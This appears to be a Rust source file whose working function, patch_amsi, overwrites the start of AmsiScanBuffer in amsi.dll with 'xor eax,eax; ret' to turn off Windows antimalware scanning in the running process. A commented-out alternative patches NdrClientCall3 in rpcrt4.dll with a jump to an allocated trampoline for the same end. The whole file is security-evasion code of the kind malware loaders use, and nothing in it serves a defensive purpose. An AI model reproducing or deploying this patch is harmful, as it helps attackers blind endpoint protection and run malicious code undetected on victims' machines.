use std::ffi::c_void;

use windows::Win32::System::{Diagnostics::Debug::WriteProcessMemory, LibraryLoader::{GetProcAddress, LoadLibraryA}, Memory::{VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}, Threading::{GetCurrentProcess, OpenProcess, PROCESS_ALL_ACCESS}};
use windows_core::s;

pub fn patch_amsi() {
    let hmodule = unsafe { LoadLibraryA(s!("amsi.dll")).unwrap() };
    let addr = unsafe { GetProcAddress(hmodule, s!("AmsiScanBuffer")).unwrap()} ;
    let target_ptr = addr as *const c_void;

    let patch: [u8;3] = [0x31, 0xC0, 0xC3];

    unsafe {
        WriteProcessMemory(
            GetCurrentProcess(), 
            target_ptr, 
            patch.as_ptr() as *const c_void, 
            patch.len(), 
            None
        ).unwrap();
    }
}

//pub fn patch_amsi() {
//    let trampoline_ptr = unsafe { 
//        VirtualAllocEx(
//            GetCurrentProcess(), 
//            None, 
//            0x6, 
//            MEM_COMMIT | MEM_RESERVE, 
//            PAGE_EXECUTE_READWRITE,
//        ) 
//    };
//
//    if trampoline_ptr.is_null() {
//        eprintln!("malloc error.");
//        return;
//    }
//
//    println!("trampoline: {:x?}", trampoline_ptr);
//    // mov eax, 0
//    // ret
//    let trampoline: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3];
//
//    unsafe {
//        std::ptr::copy_nonoverlapping(trampoline.as_ptr(), trampoline_ptr as *mut u8, trampoline.len());
//    }
//
//    let hmodule = unsafe { LoadLibraryA(s!("rpcrt4.dll")).unwrap() };
//    let addr = unsafe { GetProcAddress(hmodule, s!("NdrClientCall3")).unwrap()} ;
//    let target_ptr = addr as *const c_void;
//
//    let patch: Vec<u8> = vec![
//        vec![0x48, 0xb8],
//        trampoline_ptr.addr().to_le_bytes().to_vec(),
//        vec![0xff, 0xe0],
//    ].into_iter().flatten().collect();
//
//    unsafe {
//        WriteProcessMemory(
//            GetCurrentProcess(), 
//            target_ptr, 
//            patch.as_ptr() as *const c_void, 
//            patch.len(), 
//            None
//        ).unwrap();
//    }
//
//}